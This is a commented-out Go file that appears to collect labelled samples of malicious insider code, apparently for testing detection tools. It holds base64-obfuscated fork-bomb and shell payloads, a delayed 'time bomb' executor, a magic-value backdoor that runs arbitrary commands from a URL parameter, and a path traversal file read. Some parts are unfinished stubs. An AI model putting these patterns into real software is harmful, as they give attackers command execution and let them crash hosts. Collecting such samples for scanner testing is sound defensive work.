package main

// import (
// 	"bufio"
// 	"encoding/base64"
// 	"fmt"
// 	"log"
// 	"net/http"
// 	"os"
// 	"os/exec"
// 	"time"
// )

// // /insider
// func insiderHandler(w http.ResponseWriter, r *http.Request) {
// 	if r.Method == "GET" {
// 		inPlainSight := "Oigpezp8OiZ9Ozo="
// 		source := "cHVibGljIGNsYXNzIEZvcmtCb21iIHsgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYXJncykgeyB3aGlsZSh0cnVlKSB7IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tdeyJqYXZhdyIsICItY3AiLCBTeXN0ZW0uZ2V0UHJvcGVydHkoImphdmEuY2xhc3MucGF0aCIpLCAiRm9ya0JvbWIifSk7IH0gfSB9"
// 		command := "c2ggL3RtcC9zaGVsbGNvZGUuc2g="

// 		// RECIPE: Time Bomb pattern
// 		ticking(command)

// 		// RECIPE: Magic Value leading to command injection
// 		q := r.URL.Query()
// 		if q.Get("tracefn") == "C4A938B6FE01E" {
// 			cmd := exec.Command(q.Get("cmd"))
// 			if err := cmd.Run(); err != nil {
// 				log.Printf("Exec cmd %s err", q.Get("cmd"))
// 			}
// 		}

// 		// RECIPE: Path Traversal
// 		x := q.Get("x")

// 		file, err := os.Open(x)
// 		if err != nil {
// 			log.Fatal(err)
// 		}
// 		defer file.Close()

// 		scanner := bufio.NewScanner(file)
// 		for scanner.Scan() {
// 			fmt.Println(scanner.Text())
// 		}

// 		if err := scanner.Err(); err != nil {
// 			log.Fatal(err)
// 		}
// 		// RECIPE: Compiler Abuse Pattern
// 		//TODO

// 		// RECIPE: Abuse Class Loader pattern (attacker controlled)

// 		// RECIPE: Execute a Fork Bomb and DDOS the host
// 		fb := base64.StdEncoding.DecodeString(inPlainSight)
// 		// RECIPE: Escape validation framework
// 	}
// }

// func ticking(parameter string) {
// 	timer := time.NewTimer(3600 * time.Second)
// 	result, _ := base64.StdEncoding.DecodeString(parameter)
// 	execPattern := string(result)
// 	<-timer.C
// 	fmt.Println("Time to execute a Fork Bomb")
// 	cmd := exec.Command(execPattern)

// 	if err := cmd.Run(); err != nil {
// 		log.Println("Exec cmd err")
// 	}
// }
